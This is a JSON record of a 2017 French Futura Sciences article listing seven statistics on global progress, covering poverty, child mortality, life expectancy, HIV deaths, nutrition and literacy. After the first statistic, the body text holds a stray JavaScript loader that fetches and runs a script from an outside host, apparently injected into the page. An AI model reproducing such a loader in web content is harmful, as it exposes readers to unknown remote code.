{"title": "7 statistiques qui montrent que l'on vit dans un monde meilleur", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "19/09/2017", "content": "Moins de pauvreté, moins de morts du Sida, moins de sous-nutrition... Malgré les guerres et les catastrophes naturelles, différentes données mondiales indiquent que l'humanité se porte mieux que jamais.  Ce qu'il faut retenir L'espérance de vie a progressé partout dans le monde au cours du siècle dernier. En ce qui concerne les enfants, ils reçoivent une meilleure instruction et il y a moins de mortalité infantile. L'amélioration des conditions de vie et le recul de la pauvreté participent au bien-être des populations. La santé et la qualité de vie dans le monde connaissent des améliorations notables depuis le début du XX e  siècle. Qu'il s'agisse de la faim dans le monde, de la mortalité ou des maladies, des milliards de personnes vivent mieux aujourd'hui qu'hier, d'après des données fournies en grande partie par  Our Word in Data , une initiative financée par la fondation  Bill and Melinda Gates . 1. L’extrême pauvreté recule D'après  World Bank Data , l'extrême  pauvreté  se définit comme un niveau de vie inférieur à 1,90 dollar par jour (soit 1,60 euro). Au début des années 1980, 44 % de la population vivait dans cette extrême pauvreté, contre environ 10 % aujourd'hui.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  2. Moins de morts chez les enfants avant 5 ans Depuis 1990, le nombre d'enfants qui meurent avant 5 ans aurait diminué de moitié. Comme le révèlent les données du  Global Burden of Disease  parues récemment dans  The Lancet , en 2016, il y aurait eu moins de cinq millions de décès chez les enfants de moins de 5 ans. En 1990, il y en a eu 11 millions et en 1970 plus de 16 millions. Ceci est la conséquence de l'amélioration des conditions sanitaires dans des pays en voie de développement, avec, par exemple, une meilleure  prévention  du  paludisme  et un meilleur accès à l'eau potable. L’espérance de vie a augmenté partout dans le monde. ©  Our World in Data , CC by-sa 4.0                               3. L’espérance de vie continue de progresser Entre 1970 et 2016, l'humanité a gagné en moyenne 14 ans d' espérance de vie . En 2016, celle-ci était en moyenne de 72,5 ans (75,3 ans pour les femmes et 69,8 ans pour les hommes). L' espérance de vie  augmente partout dans le monde depuis plusieurs décennies, et ce n'est pas seulement dû à la baisse de la mortalité infantile. Voir aussi : Espérance de vie : en Europe, on vit cinq ans de plus qu’en 1980 4. Moins d'enfants par femme et plus de contraception Depuis 1950, les femmes ont de moins en moins d'enfants dans le monde. L'accès à la  contraception  permet aux femmes d'avoir moins d'enfants et favorise une meilleure qualité de vie pour ces derniers. C'est aussi un progrès pour l'indépendance des femmes : dans les pays les plus pauvres, celles-ci sont de plus en plus nombreuses à avoir accès à une contraception.  5. Les décès dus au VIH diminuent Les traitements anti-VIH ont progressé, et les personnes  séropositives  peuvent espérer vivre plus longtemps. En 2015, 36 millions de personnes dans le monde vivaient avec le  VIH . Toutefois, depuis le début des années 2000, le nombre de nouvelles infections diminue. Cependant, dans certains pays, le nombre de nouveaux cas reste élevé, comme en Afrique du Sud. Le taux de décès dus au  VIH  était élevé au milieu des années 2000 mais il diminue depuis. Le nombre de décès dus au VIH a diminué ces dix dernières années. ©  Our World in Data , CC by-sa 4.0                               6. Un meilleur accès à l'alimentation L'une des grandes améliorations en termes de santé publique est un meilleur accès à une  alimentation saine . En 1961, une personne consommait en moyenne 2.200  calories  par jour ; en 2013, c'était 2.900 calories. La qualité s'est aussi améliorée, avec plus de produits frais. La  malnutrition  a reculé dans le monde : la sous-nutrition a diminué depuis 1970 dans les pays en voie de développement ; en 2015, un seul pays (Haïti) avait plus de la moitié de sa population considérée comme en état de sous-nutrition, contre neuf pays en 1991. 7. Le recul de l'illettrisme Aujourd'hui, moins de 20 % des plus de 15 ans seraient illettrés, contre près des deux tiers (64 %) de la population en 1950. Interview : quels sont les secrets de la longévité ?                       Les êtres vivants ont une espérance de vie limitée et la recherche commence à comprendre quels sont les mécanismes en cause. Mais connaître ces secrets permettrait-il une vie plus longue ? Futura-Sciences a interviewé Vera Gorbunova, chercheuse en biologie, lors de son allocution à TEDxCannes, afin d’en savoir plus.                                       ", "theme": "sante"}